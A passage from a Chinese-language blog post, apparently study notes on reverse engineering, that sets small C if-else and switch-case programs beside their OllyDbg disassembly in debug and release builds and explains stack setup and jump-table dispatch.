class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;haha&quot;);</span><br><span class=\"line\">\tint a=1, b=2;</span><br><span class=\"line\">\tif (a&gt;b)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tprintf(&quot;zhizhang&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>debug</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00EF13A0 &gt;  55              push    ebp</span><br><span class=\"line\">00EF13A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00EF13A3    81EC D8000000   sub     esp,0xD8</span><br><span class=\"line\">00EF13A9    53              push    ebx</span><br><span class=\"line\">00EF13AA    56              push    esi</span><br><span class=\"line\">00EF13AB    57              push    edi</span><br><span class=\"line\">00EF13AC    8DBD 28FFFFFF   lea     edi,dword ptr ss:[ebp-0xD8]</span><br><span class=\"line\">00EF13B2    B9 36000000     mov     ecx,0x36</span><br><span class=\"line\">00EF13B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00EF13BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//堆栈操作上面有写，自己看啊</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13BE    8BF4            mov     esi,esp</span><br><span class=\"line\">00EF13C0    68 5057EF00     push    00EF5750                              ; ASCII &quot;haha&quot;</span><br><span class=\"line\">00EF13C5    FF15 BC82EF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00EF13CB    83C4 04         add     esp,0x4</span><br><span class=\"line\">//printf调用结束后保护现场，属于手动清栈</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13CE    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EF13D0    E8 70FDFFFF     call    00EF1145</span><br><span class=\"line\">//00EF1145   /E9 16030000     jmp     _RTC_CheckEsp</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13D5    C745 F8 0100000&gt;mov     dword ptr ss:[ebp-0x8],0x1</span><br><span class=\"line\">00EF13DC    C745 EC 0200000&gt;mov     dword ptr ss:[ebp-0x14],0x2</span><br><span class=\"line\">//局部变量a,b入栈</span><br><span class=\"line\"></span><br><span class=\"line\">00EF13E3    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00EF13E6    3B45 EC         cmp     eax,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">比较a 和 b的大小</span><br><span class=\"line\">00EF13E9    7E 19           jle     short 00EF1404</span><br><span class=\"line\">00EF13EB    8BF4            mov     esi,esp</span><br><span class=\"line\">00EF13ED    68 4857EF00     push    00EF5748                              ; ASCII &quot;shabi&quot;</span><br><span class=\"line\">00EF13F2    FF15 BC82EF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00EF13F8    83C4 04         add     esp,0x4</span><br><span class=\"line\">00EF13FB    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EF13FD    E8 43FDFFFF     call    00EF1145</span><br><span class=\"line\">00EF1402    EB 17           jmp     short 00EF141B</span><br><span class=\"line\">00EF1404    8BF4            mov     esi,esp</span><br><span class=\"line\">00EF1406    68 3C57EF00     push    00EF573C                              ; ASCII &quot;zhizhang&quot;</span><br><span class=\"line\">00EF140B    FF15 BC82EF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00EF1411    83C4 04         add     esp,0x4</span><br><span class=\"line\">00EF1414    3BF4            cmp     esi,esp</span><br><span class=\"line\">00EF1416    E8 2AFDFFFF     call    00EF1145</span><br><span class=\"line\">00EF141B    33C0            xor     eax,eax</span><br><span class=\"line\">00EF141D    5F              pop     edi</span><br><span class=\"line\">00EF141E    5E              pop     esi</span><br><span class=\"line\">00EF141F    5B              pop     ebx</span><br><span class=\"line\">00EF1420    81C4 D8000000   add     esp,0xD8</span><br><span class=\"line\">00EF1426    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00EF1428    E8 18FDFFFF     call    00EF1145</span><br><span class=\"line\">00EF142D    8BE5            mov     esp,ebp</span><br><span class=\"line\">00EF142F    5D              pop     ebp</span><br><span class=\"line\">00EF1430    C3              retn</span><br></pre></td></tr></table></figure>\n<p>release</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000E1000 &gt;/$  56            push    esi</span><br><span class=\"line\">000E1001  |.  8B35 A0200E00 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]    ;  msvcr90.printf</span><br><span class=\"line\">000E1007  |.  68 F4200E00   push    000E20F4                                ; /format = &quot;haha&quot;</span><br><span class=\"line\">000E100C  |.  FFD6          call    esi                                     ; \\printf</span><br><span class=\"line\">000E100E  |.  68 FC200E00   push    000E20FC                                ;  ASCII &quot;zhizhang&quot;</span><br><span class=\"line\">000E1013  |.  FFD6          call    esi</span><br><span class=\"line\">000E1015  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">000E1018  |.  33C0          xor     eax,eax</span><br><span class=\"line\">000E101A  |.  5E            pop     esi</span><br><span class=\"line\">000E101B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>OD 文件夹中有 UDD 作为缓存</p>\n</blockquote>\n<h4 id=\"switch-case\"><a class=\"markdownIt-Anchor\" href=\"#switch-case\">#</a> switch case</h4>\n<blockquote>\n<p><strong>switch-case</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;haha&quot;);</span><br><span class=\"line\">\tint a=1, b=2;</span><br><span class=\"line\">\tswitch(a)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tcase 1:</span><br><span class=\"line\">\t\tprintf(&quot;1111&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase 2:</span><br><span class=\"line\">\t\tprintf(&quot;2222&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase 3:</span><br><span class=\"line\">\t\tprintf(&quot;3333&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tdefault:</span><br><span class=\"line\">\t\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00FF13BE    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF13C0    <span class=\"number\">68</span> 5C57FF00     push    00FF575C                                ; ASCII <span class=\"string\">&quot;haha&quot;</span></span><br><span class=\"line\">00FF13C5    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF13CB    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\">00FF13CE    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF13D0    E8 70FDFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF13D5    C745 F8 <span class=\"number\">0</span>100000&gt;mov     dword ptr ss:[ebp-<span class=\"number\">0x8</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\">00FF13DC    C745 EC 0200000&gt;mov     dword ptr ss:[ebp-<span class=\"number\">0x14</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\">//局部变量a,b入栈</span><br><span class=\"line\">00FF13E3    8B45 F8         mov     eax,dword ptr ss:[ebp-<span class=\"number\">0x8</span>]</span><br><span class=\"line\">00FF13E6    <span class=\"number\">8985</span> 24FFFFFF   mov     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],eax</span><br><span class=\"line\">//[ebp-<span class=\"number\">0xdc</span>] = a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00FF13EC    83BD 24FFFFFF <span class=\"number\">0</span>&gt;cmp     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\">00FF13F3    <span class=\"number\">74</span> <span class=\"number\">14</span>           je      short 00FF1409</span><br><span class=\"line\">00FF13F5    83BD 24FFFFFF <span class=\"number\">0</span>&gt;cmp     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\">00FF13FC    <span class=\"number\">74</span> <span class=\"number\">24</span>           je      short 00FF1422</span><br><span class=\"line\">00FF13FE    83BD 24FFFFFF <span class=\"number\">0</span>&gt;cmp     dword ptr ss:[ebp-<span class=\"number\">0xDC</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\">00FF1405    <span class=\"number\">74</span> <span class=\"number\">34</span>           je      short 00FF143B</span><br><span class=\"line\">//比较a和<span class=\"keyword\">case</span>中值，如果相等那么跳转</span><br><span class=\"line\"></span><br><span class=\"line\">00FF1407    EB 4B           jmp     short 00FF1454</span><br><span class=\"line\">//<span class=\"keyword\">case</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1409    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF140B    <span class=\"number\">68</span> 5457FF00     push    00FF5754                                ; ASCII <span class=\"string\">&quot;1111&quot;</span></span><br><span class=\"line\">00FF1410    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF1416    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1419    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF141B    E8 25FDFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF1420    EB <span class=\"number\">49</span>           jmp     short 00FF146B</span><br><span class=\"line\">//<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1422    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF1424    <span class=\"number\">68</span> 4C57FF00     push    00FF574C                                ; ASCII <span class=\"string\">&quot;2222&quot;</span></span><br><span class=\"line\">00FF1429    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF142F    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1432    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF1434    E8 0CFDFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF1439    EB <span class=\"number\">30</span>           jmp     short 00FF146B</span><br><span class=\"line\"></span><br><span class=\"line\">00FF143B    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF143D    <span class=\"number\">68</span> 4457FF00     push    00FF5744                                ; ASCII <span class=\"string\">&quot;3333&quot;</span></span><br><span class=\"line\">00FF1442    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF1448    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\">00FF144B    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF144D    E8 F3FCFFFF     call    00FF1145</span><br><span class=\"line\">00FF1452    EB <span class=\"number\">17</span>           jmp     short 00FF146B</span><br><span class=\"line\">00FF1454    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF1456    <span class=\"number\">68</span> 3C57FF00     push    00FF573C                                ; ASCII <span class=\"string\">&quot;shabi&quot;</span></span><br><span class=\"line\">00FF145B    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF1461    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\">00FF1464    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF1466    E8 DAFCFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF146B    33C0            xor     eax,eax</span><br><span class=\"line\">00FF146D    5F              pop     edi</span><br><span class=\"line\">00FF146E    5E              pop     esi</span><br><span class=\"line\">00FF146F    5B              pop     ebx</span><br><span class=\"line\">00FF1470    81C4 DC000000   add     esp,<span class=\"number\">0xDC</span></span><br><span class=\"line\">00FF1476    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00FF1478    E8 C8FCFFFF     call    00FF1145</span><br><span class=\"line\">00FF147D    8BE5            mov     esp,ebp</span><br><span class=\"line\">00FF147F    5D              pop     ebp</span><br><span class=\"line\">00FF1480    C3              retn</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>release</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">011C1000 &gt;/$  56            push    esi</span><br><span class=\"line\">011C1001  |.  8B35 A0201C01 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]   ;  msvcr90.printf</span><br><span class=\"line\">011C1007  |.  68 F4201C01   push    011C20F4                               ; /format = &quot;haha&quot;</span><br><span class=\"line\">011C100C  |.  FFD6          call    esi                                    ; \\printf</span><br><span class=\"line\">011C100E  |.  68 FC201C01   push    011C20FC                               ;  ASCII &quot;1111&quot;</span><br><span class=\"line\">011C1013  |.  FFD6          call    esi</span><br><span class=\"line\">011C1015  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">011C1018  |.  33C0          xor     eax,eax</span><br><span class=\"line\">011C101A  |.  5E            pop     esi</span><br><span class=\"line\">011C101B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>如果 case 很多的时候，会使用导出表</p>\n<p>用 case 最大的 - case 最小的，得出的范围称为 k，如果要判断的值 - case 最小的值不在范围 k 之内，直接 default</p>\n<p>其实这样的，edx 存放的是 a 与 case 中最小值的差值，而 eax*4 + 地址存放的是每个 case 的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;haha&quot;);</span><br><span class=\"line\">\tint a=5;</span><br><span class=\"line\">\tswitch(a)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tcase 1:</span><br><span class=\"line\">\t\tprintf(&quot;1&quot;);</span><br><span class=\"line\">\tcase 5:</span><br><span class=\"line\">\t\tprintf(&quot;5&quot;);</span><br><span class=\"line\">\tcase 9:</span><br><span class=\"line\">\t\tprintf(&quot;9&quot;);</span><br><span class=\"line\">\tcase 2:</span><br><span class=\"line\">\t\tprintf(&quot;2&quot;);</span><br><span class=\"line\">\tcase 7:</span><br><span class=\"line\">\t\tprintf(&quot;7&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase 13:</span><br><span class=\"line\">\t\tprintf(&quot;13&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tdefault:</span><br><span class=\"line\">\t\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00F713A0 &gt;  55              push    ebp</span><br><span class=\"line\">00F713A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00F713A3    81EC D0000000   sub     esp,0xD0</span><br><span class=\"line\">00F713A9    53              push    ebx</span><br><span class=\"line\">00F713AA    56              push    esi</span><br><span class=\"line\">00F713AB    57              push    edi</span><br><span class=\"line\">00F713AC    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">00F713B2    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">00F713B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00F713BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00F713BE    8BF4            mov     esi,esp</span><br><span class=\"line\">00F713C0    68 5C57F700     push    00F7575C                              ; ASCII &quot;haha&quot;</span><br><span class=\"line\">00F713C5    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F713CB    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F713CE    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F713D0    E8 70FDFFFF     call    00F71145</span><br><span class=\"line\">00F713D5    C745 F8 0500000&gt;mov     dword ptr ss:[ebp-0x8],0x5            ; a = 5</span><br><span class=\"line\">00F713DC    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00F713DF    8985 30FFFFFF   mov     dword ptr ss:[ebp-0xD0],eax</span><br><span class=\"line\">00F713E5    8B8D 30FFFFFF   mov     ecx,dword ptr ss:[ebp-0xD0]           ; ecx = eax = 5</span><br><span class=\"line\">00F713EB    83E9 01         sub     ecx,0x1                               ; ecx = ecx - 1 计算a与case中最小值的差值</span><br><span class=\"line\">00F713EE    898D 30FFFFFF   mov     dword ptr ss:[ebp-0xD0],ecx           ; [ebp-0x0d] = 4 4在13-1的范围之间</span><br><span class=\"line\">00F713F4    83BD 30FFFFFF 0&gt;cmp     dword ptr ss:[ebp-0xD0],0xC           ; 将a 与case 中最小值的差1值和case最大最小差值12相比</span><br><span class=\"line\">00F713FB    0F87 A2000000   ja      00F714A3                              ; 如果当前要比较的值和case最小值的差值&gt;12,直接default</span><br><span class=\"line\">00F71401    8B95 30FFFFFF   mov     edx,dword ptr ss:[ebp-0xD0]           ; edx中存放的就是a与case最小值的差值 0xF714EC存放导出表地址</span><br><span class=\"line\">00F71407    0FB682 EC14F700 movzx   eax,byte ptr ds:[edx+0xF714EC]        ; eax=2</span><br><span class=\"line\">00F7140E    FF2485 D014F700 jmp     dword ptr ds:[eax*4+0xF714D0]         ; 2*4 + 0xF714D0</span><br><span class=\"line\">00F71415    8BF4            mov     esi,esp</span><br><span class=\"line\">00F71417    68 5857F700     push    00F75758                              ; UNICODE &quot;1&quot;</span><br><span class=\"line\">00F7141C    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71422    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F71425    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F71427    E8 19FDFFFF     call    00F71145</span><br><span class=\"line\">00F7142C    8BF4            mov     esi,esp</span><br><span class=\"line\">00F7142E    68 5457F700     push    00F75754                              ; UNICODE &quot;5&quot;</span><br><span class=\"line\">00F71433    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71439    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F7143C    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F7143E    E8 02FDFFFF     call    00F71145</span><br><span class=\"line\">00F71443    8BF4            mov     esi,esp</span><br><span class=\"line\">00F71445    68 5057F700     push    00F75750                              ; UNICODE &quot;9&quot;</span><br><span class=\"line\">00F7144A    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71450    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F71453    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F71455    E8 EBFCFFFF     call    00F71145</span><br><span class=\"line\">00F7145A    8BF4            mov     esi,esp</span><br><span class=\"line\">00F7145C    68 4C57F700     push    00F7574C                              ; UNICODE &quot;2&quot;</span><br><span class=\"line\">00F71461    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71467    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F7146A    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F7146C    E8 D4FCFFFF     call    00F71145</span><br><span class=\"line\">00F71471    8BF4            mov     esi,esp</span><br><span class=\"line\">00F71473    68 4857F700     push    00F75748                              ; UNICODE &quot;7&quot;</span><br><span class=\"line\">00F71478    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F7147E    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F71481    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F71483    E8 BDFCFFFF     call    00F71145</span><br><span class=\"line\">00F71488    EB 30           jmp     short printf</span><br><span class=\"line\">00F7148A    8BF4            mov     esi,esp</span><br><span class=\"line\">00F7148C    68 4457F700     push    00F75744                              ; ASCII &quot;13&quot;</span><br><span class=\"line\">00F71491    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71497    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F7149A    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F7149C    E8 A4FCFFFF     call    00F71145</span><br><span class=\"line\">00F714A1    EB 17           jmp     short printf</span><br><span class=\"line\">00F714A3    8BF4            mov     esi,esp</span><br><span class=\"line\">00F714A5    68 3C57F700     push    00F7573C                              ; ASCII &quot;shabi&quot;</span><br><span class=\"line\">00F714AA    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F714B0    83C4 04         add     